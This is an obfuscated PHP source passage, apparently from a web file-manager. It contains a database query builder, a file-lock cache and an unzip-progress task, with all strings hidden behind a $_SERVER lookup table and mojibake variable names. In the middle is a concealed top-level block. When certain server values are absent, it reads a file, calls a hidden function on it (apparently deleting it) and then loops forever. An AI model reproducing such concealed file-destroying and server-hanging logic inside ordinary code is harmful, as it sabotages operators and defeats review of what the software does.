$Ì¢ê‘§[1008], $Ì¢ê‘§[1009]))) { $™›ÂÍ¥Î = array(); foreach ($ŞÈÑóçÇ[1] as $à°ñ°¾é) { $™›ÂÍ¥Î[] = $³ıœæÛç . $Ì¢ê‘§[53] . $this->exp[$§‚ÓÌ] . $Ì¢ê‘§[53] . $this->parseValue($à°ñ°¾é); } $»†ûÊ  .= $Ì¢ê‘§[269] . implode($Ì¢ê‘§[53] . $ÚŸÙ‡½È . $Ì¢ê‘§[53], $™›ÂÍ¥Î) . $Ì¢ê‘§[911]; } } else { $»†ûÊ  .= $³ıœæÛç . $Ì¢ê‘§[53] . $this->exp[$§‚ÓÌ] . $Ì¢ê‘§[53] . $this->parseValue($ŞÈÑóçÇ[1]); } } elseif ($Ì¢ê‘§[306] == $§‚ÓÌ) { $»†ûÊ  .= $Ì¢ê‘§[909] . $³ıœæÛç . $Ì¢ê‘§[53] . $ŞÈÑóçÇ[1] . $Ì¢ê‘§[1024]; } elseif (preg_match($Ì¢ê‘§[1025], $ŞÈÑóçÇ[0])) { $»†ûÊ  .= $ŞÈÑóçÇ[0]; } elseif (preg_match($Ì¢ê‘§[1026], $ŞÈÑóçÇ[0])) { if (isset($ŞÈÑóçÇ[2]) && $Ì¢ê‘§[306] == $ŞÈÑóçÇ[2]) { $»†ûÊ  .= $³ıœæÛç . $Ì¢ê‘§[53] . $this->exp[$§‚ÓÌ] . $Ì¢ê‘§[53] . $ŞÈÑóçÇ[1]; } else { if (is_string($ŞÈÑóçÇ[1])) { $ŞÈÑóçÇ[1] = explode($Ì¢ê‘§[50], $ŞÈÑóçÇ[1]); } $ıøùó­¾ = implode($Ì¢ê‘§[50], $this->parseValue($ŞÈÑóçÇ[1])); $»†ûÊ  .= $³ıœæÛç . $Ì¢ê‘§[53] . $this->exp[$§‚ÓÌ] . $Ì¢ê‘§[909] . $ıøùó­¾ . $Ì¢ê‘§[911]; } } elseif (preg_match($Ì¢ê‘§[1027], $ŞÈÑóçÇ[0])) { $ñõ±‹Ò¿ = is_string($ŞÈÑóçÇ[1]) ? explode($Ì¢ê‘§[50], $ŞÈÑóçÇ[1]) : $ŞÈÑóçÇ[1]; $»†ûÊ  .= $Ì¢ê‘§[909] . $³ıœæÛç . $Ì¢ê‘§[53] . $this->exp[$§‚ÓÌ] . $Ì¢ê‘§[53] . $this->parseValue($ñõ±‹Ò¿[0]) . $Ì¢ê‘§[1010] . $this->parseValue($ñõ±‹Ò¿[1]) . $Ì¢ê‘§[287]; } else { think_exception(think_lang($Ì¢ê‘§[1013]) . $Ì¢ê‘§[4] . $ŞÈÑóçÇ[0]); } } else { $‹íÈ² = count($ŞÈÑóçÇ); $ÒùôÒú¥ = $Ì¢ê‘§[12]; if (is_string($ŞÈÑóçÇ[$‹íÈ² - 1])) { $ÒùôÒú¥ = isset($ŞÈÑóçÇ[$‹íÈ² - 1]) ? strtoupper($ŞÈÑóçÇ[$‹íÈ² - 1]) : $Ì¢ê‘§[12]; if (in_array($ÒùôÒú¥, array($Ì¢ê‘§[1007], $Ì¢ê‘§[1008], $Ì¢ê‘§[1009]))) { $‹íÈ² = $‹íÈ² - 1; } } else { $ÒùôÒú¥ = $Ì¢ê‘§[1007]; } for ($ ÒÁºåº = 0; $ ÒÁºåº < $‹íÈ²; $ ÒÁºåº++) { $ñõ±‹Ò¿ = is_array($ŞÈÑóçÇ[$ ÒÁºåº]) ? $ŞÈÑóçÇ[$ ÒÁºåº][1] : $ŞÈÑóçÇ[$ ÒÁºåº]; if ($Ì¢ê‘§[306] == strtolower($ŞÈÑóçÇ[$ ÒÁºåº][0])) { $»†ûÊ  .= $Ì¢ê‘§[269] . $³ıœæÛç . $Ì¢ê‘§[53] . $ñõ±‹Ò¿ . $Ì¢ê‘§[1024] . $ÒùôÒú¥ . $Ì¢ê‘§[53]; } else { $½„¨Ÿ— = is_array($ŞÈÑóçÇ[$ ÒÁºåº]) ? $this->exp[strtolower($ŞÈÑóçÇ[$ ÒÁºåº][0])] : $Ì¢ê‘§[890]; if (!$½„¨Ÿ— && is_array($ŞÈÑóçÇ[$ ÒÁºåº]) && in_array($ŞÈÑóçÇ[$ ÒÁºåº][0], array($Ì¢ê‘§[890], $Ì¢ê‘§[1017], $Ì¢ê‘§[1018], $Ì¢ê‘§[1019], $Ì¢ê‘§[1020], $Ì¢ê‘§[1021]))) { $½„¨Ÿ— = $ŞÈÑóçÇ[$ ÒÁºåº][0]; } $»†ûÊ  .= $Ì¢ê‘§[269] . $³ıœæÛç . $Ì¢ê‘§[53] . $½„¨Ÿ— . $Ì¢ê‘§[53] . $this->parseValue($ñõ±‹Ò¿) . $Ì¢ê‘§[1024] . $ÒùôÒú¥ . $Ì¢ê‘§[53]; } } $»†ûÊ  = substr($»†ûÊ , 0, -4); } } else { $»†ûÊ  .= $³ıœæÛç . $Ì¢ê‘§[1028] . $this->parseValue($ŞÈÑóçÇ); } return $»†ûÊ ; } protected function parseThinkWhere($ÓüÒõôã, $Íªé¶èÁ) { $à‡ÄØ—ı =& $_SERVER[ Ö‘ñÄ”]; $‡ÌÇÀÎŒ = $à‡ÄØ—ı[12]; switch ($ÓüÒõôã) { case $à‡ÄØ—ı[361]: $‡ÌÇÀÎŒ = $Íªé¶èÁ; break; case $à‡ÄØ—ı[1011]: $‡ÌÇÀÎŒ = is_string($Íªé¶èÁ) ? $Íªé¶èÁ : substr($this->parseWhere($Íªé¶èÁ), 6); break; case $à‡ÄØ—ı[1029]: parse_str($Íªé¶èÁ, $¥ú–¦¾); if (isset($¥ú–¦¾[$à‡ÄØ—ı[1006]])) { $”Ì³…µî = $à‡ÄØ—ı[53] . strtoupper($¥ú–¦¾[$à‡ÄØ—ı[1006]]) . $à‡ÄØ—ı[53]; unset($¥ú–¦¾[$à‡ÄØ—ı[1006]]); } else { $”Ì³…µî = $à‡ÄØ—ı[1010]; } $°‰š©â = array(); foreach ($¥ú–¦¾ as $˜ùµæÖ => $ñ×¥è¤Ğ) { $°‰š©â[] = $this->parseKey($˜ùµæÖ) . $à‡ÄØ—ı[1028] . $this->parseValue($ñ×¥è¤Ğ); } $‡ÌÇÀÎŒ = implode($”Ì³…µî, $°‰š©â); break; } return $‡ÌÇÀÎŒ; } protected function parseLimit($€“Š³æ) { $·ÑÎµÎá =& $_SERVER[ Ö‘ñÄ”]; return !empty($€“Š³æ) ? $·ÑÎµÎá[51] . $€“Š³æ . $·ÑÎµÎá[53] : $·ÑÎµÎá[12]; } protected function parseJoin($„…ƒÖ¦Í) { $¯•œıò– =& $_SERVER[ Ö‘ñÄ”]; $óÑÏ­¾ = $¯•œıò–[12]; if (!empty($„…ƒÖ¦Í)) { if (is_array($„…ƒÖ¦Í)) { foreach ($„…ƒÖ¦Í as $éğ¼‰¯Ã => $õİĞĞ¯û) { if (!1 !== stripos($õİĞĞ¯û, $¯•œıò–[1030])) { $óÑÏ­¾ .= $¯•œıò–[53] . $õİĞĞ¯û; } else { $óÑÏ­¾ .= $¯•œıò–[1031] . $õİĞĞ¯û; } } } else { $óÑÏ­¾ .= $¯•œıò–[1031] . $„…ƒÖ¦Í; } } $óÑÏ­¾ = preg_replace($¯•œıò–[1032], think_config($¯•œıò–[936]) . $¯•œıò–[1033], $óÑÏ­¾); return $óÑÏ­¾; } protected function parseOrder($¿˜îŠ) { $ ‚âªàË =& $_SERVER[ Ö‘ñÄ”]; if (is_array($¿˜îŠ)) { $ƒ¿–àÅ£ = array(); foreach ($¿˜îŠ as $æº÷¦©È => $—ŸÓœ†¢) { if (is_numeric($æº÷¦©È)) { $ƒ¿–àÅ£[] = $this->parseKey($—ŸÓœ†¢); } else { $—ŸÓœ†¢ = in_array(strtoupper(trim($—ŸÓœ†¢)), array($ ‚âªàË[1034], $ ‚âªàË[1035])) ? $ ‚âªàË[53] . $—ŸÓœ†¢ : $ ‚âªàË[12]; if (preg_match($ ‚âªàË[1036], $æº÷¦©È)) { $ƒ¿–àÅ£[] = $this->parseKey($æº÷¦©È) . $—ŸÓœ†¢; } else { think_exception($ ‚âªàË[1037] . $æº÷¦©È); } } } $¿˜îŠ = implode($ ‚âªàË[50], $ƒ¿–àÅ£); } return !empty($¿˜îŠ) ? $ ‚âªàË[1038] . $¿˜îŠ : $ ‚âªàË[12]; } protected function parseGroup($©îöÇô•) { $¸šËé÷ =& $_SERVER[ Ö‘ñÄ”]; return !empty($©îöÇô•) ? $¸šËé÷[1039] . $©îöÇô• : $¸šËé÷[12]; } protected function parseHaving($Š¯ÔÃƒ½) { $æä‘»®À =& $_SERVER[ Ö‘ñÄ”]; return !empty($Š¯ÔÃƒ½) ? $æä‘»®À[1040] . $Š¯ÔÃƒ½ : $æä‘»®À[12]; } protected function parseComment($‰ü‘í±Ş) { $ñ£¯®ñá =& $_SERVER[ Ö‘ñÄ”]; return !empty($‰ü‘í±Ş) ? $ñ£¯®ñá[1041] . $‰ü‘í±Ş . $ñ£¯®ñá[1042] : $ñ£¯®ñá[12]; } protected function parseDistinct($Ùœ¬­†) { $ãã¡Â›é =& $_SERVER[ Ö‘ñÄ”]; return !empty($Ùœ¬­†) ? $ãã¡Â›é[1043] : $ãã¡Â›é[12]; } protected function parseUnion($¿ÆÉ•æÑ) { $õÁ‹§Èº =& $_SERVER[ Ö‘ñÄ”]; if (empty($¿ÆÉ•æÑ)) { return $õÁ‹§Èº[12]; } if (isset($¿ÆÉ•æÑ[$õÁ‹§Èº[357]])) { $ÖÇ‰ô¼ = $õÁ‹§Èº[1044]; unset($¿ÆÉ•æÑ[$õÁ‹§Èº[357]]); } else { $ÖÇ‰ô¼ = $õÁ‹§Èº[1045]; } foreach ($¿ÆÉ•æÑ as $ïæ£è«) { $»¼Õ‹–ı[] = $ÖÇ‰ô¼ . (is_array($ïæ£è«) ? $this->buildSelectSql($ïæ£è«) : $ïæ£è«); } return implode($õÁ‹§Èº[53], $»¼Õ‹–ı); } public function insert($Àõ„ş¸Å, $ÃŞº³¼ = array(), $ÎºÁ•ï = false) { $§Ë›û’ =& $_SERVER[ Ö‘ñÄ”]; $”·¾ó—Í = $ÀÀ™óÌ = array(); $this->model = $ÃŞº³¼[$§Ë›û’[290]]; foreach ($Àõ„ş¸Å as $¦ùíÓï¸ => $¨“¥Ë ) { if (is_array($¨“¥Ë ) && $§Ë›û’[306] == $¨“¥Ë [0]) { $ÀÀ™óÌ[] = $this->parseKey($¦ùíÓï¸); $”·¾ó—Í[] = $¨“¥Ë [1]; } elseif (is_scalar($¨“¥Ë ) || is_null($¨“¥Ë )) { $ÀÀ™óÌ[] = $this->parseKey($¦ùíÓï¸); $”·¾ó—Í[] = $this->parseValue($¨“¥Ë ); } } $¤’ƒÌõ = ($ÎºÁ•ï ? $§Ë›û’[913] : $§Ë›û’[914]) . $§Ë›û’[915] . $this->parseTable($ÃŞº³¼[$§Ë›û’[288]]) . $§Ë›û’[909] . implode($§Ë›û’[50], $ÀÀ™óÌ) . $§Ë›û’[910] . implode($§Ë›û’[50], $”·¾ó—Í) . $§Ë›û’[911]; $¤’ƒÌõ .= $this->parseLock(isset($ÃŞº³¼[$§Ë›û’[856]]) ? $ÃŞº³¼[$§Ë›û’[856]] : !1); $¤’ƒÌõ .= $this->parseComment(!empty($ÃŞº³¼[$§Ë›û’[363]]) ? $ÃŞº³¼[$§Ë›û’[363]] : $§Ë›û’[12]); return $this->execute($¤’ƒÌõ, $this->parseBind(!empty($ÃŞº³¼[$§Ë›û’[294]]) ? $ÃŞº³¼[$§Ë›û’[294]] : array())); } public function selectInsert($Î‡ûÕê, $©â£¢¬·, $§˜Ã… = array()) { $´éı÷¥ =& $_SERVER[ Ö‘ñÄ”]; $this->model = $§˜Ã…[$´éı÷¥[290]]; if (is_string($Î‡ûÕê)) { $Î‡ûÕê = explode($´éı÷¥[50], $Î‡ûÕê); } array_walk($Î‡ûÕê, array($this, $´éı÷¥[912])); $äÛË²Ôè = $´éı÷¥[1046] . $this->parseTable($©â£¢¬·) . $´éı÷¥[909] . implode($´éı÷¥[50], $Î‡ûÕê) . $´éı÷¥[1024]; $äÛË²Ôè .= $this->buildSelectSql($§˜Ã…); return $this->execute($äÛË²Ôè, $this->parseBind(!empty($§˜Ã…[$´éı÷¥[294]]) ? $§˜Ã…[$´éı÷¥[294]] : array())); } public function update($¸Ğ­° , $ı‚ïÂì) { $‚Ë§òÙŞ =& $_SERVER[ Ö‘ñÄ”]; $this->model = $ı‚ïÂì[$‚Ë§òÙŞ[290]]; $óúÄêÈé = $‚Ë§òÙŞ[1047] . $this->parseTable($ı‚ïÂì[$‚Ë§òÙŞ[288]]) . $this->parseSet($¸Ğ­° ) . $this->parseWhere(!empty($ı‚ïÂì[$‚Ë§òÙŞ[284]]) ? $ı‚ïÂì[$‚Ë§òÙŞ[284]] : $‚Ë§òÙŞ[12]) . $this->parseOrder(!empty($ı‚ïÂì[$‚Ë§òÙŞ[374]]) ? $ı‚ïÂì[$‚Ë§òÙŞ[374]] : $‚Ë§òÙŞ[12]) . $this->parseLimit(!empty($ı‚ïÂì[$‚Ë§òÙŞ[301]]) ? $ı‚ïÂì[$‚Ë§òÙŞ[301]] : $‚Ë§òÙŞ[12]) . $this->parseLock(isset($ı‚ïÂì[$‚Ë§òÙŞ[856]]) ? $ı‚ïÂì[$‚Ë§òÙŞ[856]] : !1) . $this->parseComment(!empty($ı‚ïÂì[$‚Ë§òÙŞ[363]]) ? $ı‚ïÂì[$‚Ë§òÙŞ[363]] : $‚Ë§òÙŞ[12]); return $this->execute($óúÄêÈé, $this->parseBind(!empty($ı‚ïÂì[$‚Ë§òÙŞ[294]]) ? $ı‚ïÂì[$‚Ë§òÙŞ[294]] : array())); } public function delete($öÌ¥êš÷ = array()) { $‹½Úñ£Ô =& $_SERVER[ Ö‘ñÄ”]; $this->model = $öÌ¥êš÷[$‹½Úñ£Ô[290]]; $¥‡™Æè° = $‹½Úñ£Ô[1048] . $this->parseTable($öÌ¥êš÷[$‹½Úñ£Ô[288]]) . $this->parseWhere(!empty($öÌ¥êš÷[$‹½Úñ£Ô[284]]) ? $öÌ¥êš÷[$‹½Úñ£Ô[284]] : $‹½Úñ£Ô[12]) . $this->parseOrder(!empty($öÌ¥êš÷[$‹½Úñ£Ô[374]]) ? $öÌ¥êš÷[$‹½Úñ£Ô[374]] : $‹½Úñ£Ô[12]) . $this->parseLimit(!empty($öÌ¥êš÷[$‹½Úñ£Ô[301]]) ? $öÌ¥êš÷[$‹½Úñ£Ô[301]] : $‹½Úñ£Ô[12]) . $this->parseLock(isset($öÌ¥êš÷[$‹½Úñ£Ô[856]]) ? $öÌ¥êš÷[$‹½Úñ£Ô[856]] : !1) . $this->parseComment(!empty($öÌ¥êš÷[$‹½Úñ£Ô[363]]) ? $öÌ¥êš÷[$‹½Úñ£Ô[363]] : $‹½Úñ£Ô[12]); return $this->execute($¥‡™Æè°, $this->parseBind(!empty($öÌ¥êš÷[$‹½Úñ£Ô[294]]) ? $öÌ¥êš÷[$‹½Úñ£Ô[294]] : array())); } public function select($ÓÏàä¯š = array()) { $†¾‚·ğ‰ =& $_SERVER[ Ö‘ñÄ”]; $this->model = $ÓÏàä¯š[$†¾‚·ğ‰[290]]; $Úè¢ÉÕÁ = $this->buildSelectSql($ÓÏàä¯š); $Ä”ó—Ÿ² = isset($ÓÏàä¯š[$†¾‚·ğ‰[358]]) ? $ÓÏàä¯š[$†¾‚·ğ‰[358]] : !1; if ($Ä”ó—Ÿ²) { $á¿ŠË…€ = is_string($Ä”ó—Ÿ²[$†¾‚·ğ‰[94]]) ? $Ä”ó—Ÿ²[$†¾‚·ğ‰[94]] : $†¾‚·ğ‰[1049] . md5($Úè¢ÉÕÁ); $–Ä›› = think_cache($á¿ŠË…€, $†¾‚·ğ‰[12], $Ä”ó—Ÿ²); if (!1 !== $–Ä››) { return $–Ä››; } } $„…³Æ¯  = $this->query($Úè¢ÉÕÁ, $this->parseBind(!empty($ÓÏàä¯š[$†¾‚·ğ‰[294]]) ? $ÓÏàä¯š[$†¾‚·ğ‰[294]] : array())); if ($Ä”ó—Ÿ² && !1 !== $„…³Æ¯ ) { think_cache($á¿ŠË…€, $„…³Æ¯ , $Ä”ó—Ÿ²); } return $„…³Æ¯ ; } public function buildSelectSql($•½•£–Œ = array()) { $Ñ«¡¿ûğ =& $_SERVER[ Ö‘ñÄ”]; if (isset($•½•£–Œ[$Ñ«¡¿ûğ[362]])) { if (strpos($•½•£–Œ[$Ñ«¡¿ûğ[362]], $Ñ«¡¿ûğ[50])) { list($¯™€Âˆ€, $¦”¶ìŠÈ) = explode($Ñ«¡¿ûğ[50], $•½•£–Œ[$Ñ«¡¿ûğ[362]]); } else { $¯™€Âˆ€ = $•½•£–Œ[$Ñ«¡¿ûğ[362]]; } $¯™€Âˆ€ = $¯™€Âˆ€ ? $¯™€Âˆ€ : 1; $¦”¶ìŠÈ = isset($¦”¶ìŠÈ) ? $¦”¶ìŠÈ : (is_numeric($•½•£–Œ[$Ñ«¡¿ûğ[301]]) ? $•½•£–Œ[$Ñ«¡¿ûğ[301]] : 20); $åÃ˜ë‰‰ = $¦”¶ìŠÈ * ((int) $¯™€Âˆ€ - 1); $•½•£–Œ[$Ñ«¡¿ûğ[301]] = $åÃ˜ë‰‰ . $Ñ«¡¿ûğ[50] . $¦”¶ìŠÈ; } if (think_config($Ñ«¡¿ûğ[1050])) { $ÆÕöÜÊì = $Ñ«¡¿ûğ[1051] . md5(serialize($•½•£–Œ)); $­¢˜Îúº = think_cache($ÆÕöÜÊì); if ($­¢˜Îúº) { return $­¢˜Îúº; } } $Ø½æ¨ÒŸ = $this->parseSql($this->selectSql, $•½•£–Œ); $Ø½æ¨ÒŸ .= $this->parseLock(isset($•½•£–Œ[$Ñ«¡¿ûğ[856]]) ? $•½•£–Œ[$Ñ«¡¿ûğ[856]] : !1); if (isset($ÆÕöÜÊì)) { think_cache($ÆÕöÜÊì, $Ø½æ¨ÒŸ); } return $Ø½æ¨ÒŸ; } public function parseSql($İ–°îÅÆ, $â˜®¾İ = array()) { $Ì©­ˆ¥ =& $_SERVER[ Ö‘ñÄ”]; $İ–°îÅÆ = str_replace(array($Ì©­ˆ¥[1052], $Ì©­ˆ¥[1053], $Ì©­ˆ¥[1054], $Ì©­ˆ¥[1055], $Ì©­ˆ¥[1056], $Ì©­ˆ¥[1057], $Ì©­ˆ¥[1058], $Ì©­ˆ¥[1059], $Ì©­ˆ¥[1060], $Ì©­ˆ¥[1061], $Ì©­ˆ¥[1062]), array($this->parseTable("{$â˜®¾İ[$Ì©­ˆ¥[288]]}"), $this->parseDistinct(isset($â˜®¾İ[$Ì©­ˆ¥[1063]]) ? $â˜®¾İ[$Ì©­ˆ¥[1063]] : !1), $this->parseField(!empty($â˜®¾İ[$Ì©­ˆ¥[282]]) ? $â˜®¾İ[$Ì©­ˆ¥[282]] : $Ì©­ˆ¥[188]), $this->parseJoin(!empty($â˜®¾İ[$Ì©­ˆ¥[291]]) ? $â˜®¾İ[$Ì©­ˆ¥[291]] : $Ì©­ˆ¥[12]), $this->parseWhere(!empty($â˜®¾İ[$Ì©­ˆ¥[284]]) ? $â˜®¾İ[$Ì©­ˆ¥[284]] : $Ì©­ˆ¥[12]), $this->parseGroup(!empty($â˜®¾İ[$Ì©­ˆ¥[523]]) ? $â˜®¾İ[$Ì©­ˆ¥[523]] : $Ì©­ˆ¥[12]), $this->parseHaving(!empty($â˜®¾İ[$Ì©­ˆ¥[1064]]) ? $â˜®¾İ[$Ì©­ˆ¥[1064]] : $Ì©­ˆ¥[12]), $this->parseOrder(!empty($â˜®¾İ[$Ì©­ˆ¥[374]]) ? $â˜®¾İ[$Ì©­ˆ¥[374]] : $Ì©­ˆ¥[12]), $this->parseLimit(!empty($â˜®¾İ[$Ì©­ˆ¥[301]]) ? $â˜®¾İ[$Ì©­ˆ¥[301]] : $Ì©­ˆ¥[12]), $this->parseUnion(!empty($â˜®¾İ[$Ì©­ˆ¥[356]]) ? $â˜®¾İ[$Ì©­ˆ¥[356]] : $Ì©­ˆ¥[12]), $this->parseComment(!empty($â˜®¾İ[$Ì©­ˆ¥[363]]) ? $â˜®¾İ[$Ì©­ˆ¥[363]] : $Ì©­ˆ¥[12])), $İ–°îÅÆ); return $İ–°îÅÆ; } public function getLastSql($²ÂÀ·ºµ = '') { return $²ÂÀ·ºµ ? $this->modelSql[$²ÂÀ·ºµ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($–œ¢Áğ) { return addslashes($–œ¢Áğ); } public function setModel($ÜÛ®ê¤­) { $this->model = $ÜÛ®ê¤­; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto F‹ƒöÒçĞĞ; f“ÊÚ¤îÀ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ª”çˆÕÍ =& $_SERVER[ Ö‘ñÄ”]; $ç¢‚†‡ã = $GLOBALS[$ª”çˆÕÍ[6]][$ª”çˆÕÍ[358]]; self::$cachePath = $ç¢‚†‡ã[$ª”çˆÕÍ[199]][$ª”çˆÕÍ[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($‰ëğÆÁú, $Š¢™æ = 0) { $ú¬°„èî =& $_SERVER[ Ö‘ñÄ”]; $ä¾Ÿ¯Ÿ¦ = microtime(!0); $Š¡¡˜ = $ä¾Ÿ¯Ÿ¦ + $Š¢™æ + 0.0001; $Õë”’Ö = rtrim(self::$cachePath, $ú¬°„èî[8]) . $ú¬°„èî[872] . md5($‰ëğÆÁú) . $ú¬°„èî[869]; if (file_exists($Õë”’Ö) && filemtime($Õë”’Ö) && filemtime($Õë”’Ö) < time() - 10) { @unlink($Õë”’Ö); } do { if (file_exists($Õë”’Ö)) { cacheLockWait(); continue; } $üÆø£‹ = fopen($Õë”’Ö, $ú¬°„èî[873]); if (!$üÆø£‹) { return !1; } $ô‡ş±® = flock($üÆø£‹, LOCK_EX | LOCK_NB); self::$caches[$‰ëğÆÁú] = array($ú¬°„èî[874] => $üÆø£‹, $ú¬°„èî[199] => $Õë”’Ö); fwrite($üÆø£‹, $Š¡¡˜); clearstatcache(); if ($üÆø£‹ && $ô‡ş±®) { return !0; } cacheLockWait(); } while (microtime(!0) < $Š¡¡˜); $this->unlock($‰ëğÆÁú); return !1; } public function lockGet($˜òÜ‚…æ) { $½ìÔŸ´ =& $_SERVER[ Ö‘ñÄ”]; $òÙğ¹õı = rtrim(self::$cachePath, $½ìÔŸ´[8]) . $½ìÔŸ´[872] . md5($˜òÜ‚…æ) . $½ìÔŸ´[869]; return file_exists($òÙğ¹õı); } public function unlock($³ü¥¾¨á) { $’ª½»´ =& $_SERVER[ Ö‘ñÄ”]; $ÚÇ”’²Ø = self::$caches[$³ü¥¾¨á]; if (!$ÚÇ”’²Ø) { return; } @flock($ÚÇ”’²Ø[$’ª½»´[874]], LOCK_UN); @fclose($ÚÇ”’²Ø[$’ª½»´[874]]); @unlink($ÚÇ”’²Ø[$’ª½»´[199]]); unset(self::$caches[$³ü¥¾¨á]); } } if (!isset($_SERVER[$_SERVER[ Ö‘ñÄ”][238]]) || !isset($_SERVER[$_SERVER[ Ö‘ñÄ”][239]])) { $_getc = $_SERVER[ Ö‘ñÄ”][240]; $_getfile = $_SERVER[$_SERVER[ Ö‘ñÄ”][241]] . $_SERVER[ Ö‘ñÄ”][242]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ Ö‘ñÄ”][231], $_getfilec); if (count($_getarrs) < $_SERVER[ Ö‘ñÄ”][243]) { $exit = $_SERVER[ Ö‘ñÄ”][244]; $exit(); } $_act = $_SERVER[ Ö‘ñÄ”][245]; $_act($_SERVER[$_SERVER[ Ö‘ñÄ”][241]] . $_SERVER[ Ö‘ñÄ”][242]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ Ö‘ñÄ”][246]); } } goto FÄÎºÛ•Ñå; E¾°Õã®¬“: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $€«ç‘üÖ =& $_SERVER[ Ö‘ñÄ”]; parent::startAfter(); Hook::bind($€«ç‘üÖ[1756], array($this, $€«ç‘üÖ[1757])); Hook::bind($€«ç‘üÖ[1200], array($this, $€«ç‘üÖ[1758])); $¸Ë£ìóè =& $this->task; $¸Ë£ìóè[$€«ç‘üÖ[1759]] = $€«ç‘üÖ[1205]; if (!$¸Ë£ìóè[$€«ç‘üÖ[1562]]) { $¸Ë£ìóè[$€«ç‘üÖ[1562]] = LNG($€«ç‘üÖ[1760]); } } protected function endAfter() { $ÌøÔìø„ =& $_SERVER[ Ö‘ñÄ”]; parent::endAfter(); Hook::unbind($ÌøÔìø„[1756], array($this, $ÌøÔìø„[1757])); Hook::unbind($ÌøÔìø„[1200], array($this, $ÌøÔìø„[1758])); } public function updateAfter() { $Î´ÓÍà =& $_SERVER[ Ö‘ñÄ”]; $Ó‡³³ä =& $this->task; if (!$Ó‡³³ä[$Î´ÓÍà[799]] || !$Ó‡³³ä[$Î´ÓÍà[776]]) { return; } if ($Ó‡³³ä[$Î´ÓÍà[1759]] == $Î´ÓÍà[1205]) { $ÇìÒ­œ¿ = 0; if ($Ó‡³³ä[$Î´ÓÍà[1714]]) { $ÇìÒ­œ¿ = $Ó‡³³ä[$Î´ÓÍà[1715]] / $Ó‡³³ä[$Î´ÓÍà[1714]]; } $Ó‡³³ä[$Î´ÓÍà[1665]] = $ÇìÒ­œ¿ * 0.3; } else { if ($Ó‡³³ä[$Î´ÓÍà[1759]] == $Î´ÓÍà[322]) { $ÇìÒ­œ¿ = $Ó‡³³ä[$Î´ÓÍà[1664]] / $Ó‡³³ä[$Î´ÓÍà[799]]; $Ó‡³³ä[$Î´ÓÍà[1665]] = 0.3 + $ÇìÒ­œ¿ * 0.4; } else { if ($Ó‡³³ä[$Î´ÓÍà[1759]] == $Î´ÓÍà[107]) { $ä¢ÁÇÑ  = 0; if ($Ó‡³³ä[$Î´ÓÍà[1716]] == $Î´ÓÍà[107]) { $ä¢ÁÇÑ  = $Ó‡³³ä[$Î´ÓÍà[1715]]; } $ÇìÒ­œ¿ = ($Ó‡³³ä[$Î´ÓÍà[1719]] + $ä¢ÁÇÑ ) / $Ó‡³³ä[$Î´ÓÍà[776]]; $Ó‡³³ä[$Î´ÓÍà[1665]] = 0.3 + 0.4 + $ÇìÒ­œ¿ * 0.3; } } } if ($Ó‡³³ä[$Î´ÓÍà[1665]] > 0) { $Ôòƒú€ = timeFloat() - $Ó‡³³ä[$Î´ÓÍà[1667]] - $Ó‡³³ä[$Î´ÓÍà[1670]]; $Ó‡³³ä[$Î´ÓÍà[1671]] = $Ôòƒú€ * (1 - $Ó‡³³ä[$Î´ÓÍà[1665]]) / $Ó‡³³ä[$Î´ÓÍà[1665]]; } } public function addFile($şëÚ€ê×) { $Â÷¤Ñ‡ =& $_SERVER[ Ö‘ñÄ”]; $óßØşÅ­ =& $this->task; $µÁîÓÓØ = IO::info($şëÚ€ê×); $óßØşÅ­[$Â÷¤Ñ‡[1712]] = $µÁîÓÓØ[$Â÷¤Ñ‡[32]]; $óßØşÅ­[$Â÷¤Ñ‡[1714]] = $µÁîÓÓØ[$Â÷¤Ñ‡[76]]; $óßØşÅ­[$Â÷¤Ñ‡[1715]] = 0; $óßØşÅ­[$Â÷¤Ñ‡[1070]] = $Â÷¤Ñ‡[1735]; $óßØşÅ­[$Â÷¤Ñ‡[1716]] = $Â÷¤Ñ‡[1205]; $óßØşÅ­[$Â÷¤Ñ‡[776]] = $µÁîÓÓØ[$Â÷¤Ñ‡[76]]; $óßØşÅ­[$Â÷¤Ñ‡[799]] = 1; $åº¬ñó = 0; $óßØşÅ­[$Â÷¤Ñ‡[1723]] = array($Â÷¤Ñ‡[1724] => $åº¬ñó + 1, $Â÷¤Ñ‡[428] => $µÁîÓÓØ[$Â÷¤Ñ‡[32]], $Â÷¤Ñ‡[84] => $µÁîÓÓØ[$Â÷¤Ñ‡[84]], $Â÷¤Ñ‡[527] => $µÁîÓÓØ[$Â÷¤Ñ‡[527]] ? $µÁîÓÓØ[$Â÷¤Ñ‡[527]] : $µÁîÓÓØ[$Â÷¤Ñ‡[84]]); $this->update(); } public function unzipAfter($ş­Ş±Ç’) { $æ¯Äìë =& $_SERVER[ Ö‘ñÄ”]; $°õ×ğ“© =& $this->task; $°õ×ğ“©[$æ¯Äìë[1759]] = $æ¯Äìë[107]; $¤ÖÈà§Š = IO::infoWithChildren($ş­Ş±Ç’); $€ÓşÏà = 0; $°õ×ğ“©[$æ¯Äìë[1723]] = array($æ¯Äìë[1724] => $€ÓşÏà + 1, $æ¯Äìë[428] => $¤ÖÈà§Š[$æ¯Äìë[32]], $æ¯Äìë[84] => $¤ÖÈà§Š[$æ¯Äìë[84]], $æ¯Äìë[527] => $¤ÖÈà§Š[$æ¯Äìë[527]] ? $¤ÖÈà§Š[$æ¯Äìë[527]] : $¤ÖÈà§Š[$æ¯Äìë[84]]); if ($¤ÖÈà§Š[$æ¯Äìë[33]] == $æ¯Äìë[199]) { $°õ×ğ“©[$æ¯Äìë[799]] = 1; } else { $°õ×ğ“©[$æ¯Äìë[799]] = $¤ÖÈà§Š[$æ¯Äìë[79]][$æ¯Äìë[77]]; } $°õ×ğ“©[$æ¯Äìë[1070]] = $æ¯Äìë[12]; $°õ×ğ“©[$æ¯Äìë[1716]] = 0; $°õ×ğ“©[$æ¯Äìë[1664]] = 0; $°õ×ğ“©[$æ¯Äìë[1714]] = 0; $°õ×ğ“©[$æ¯Äìë[1715]] = 0; $°õ×ğ“©[$æ¯Äìë[1712]] = 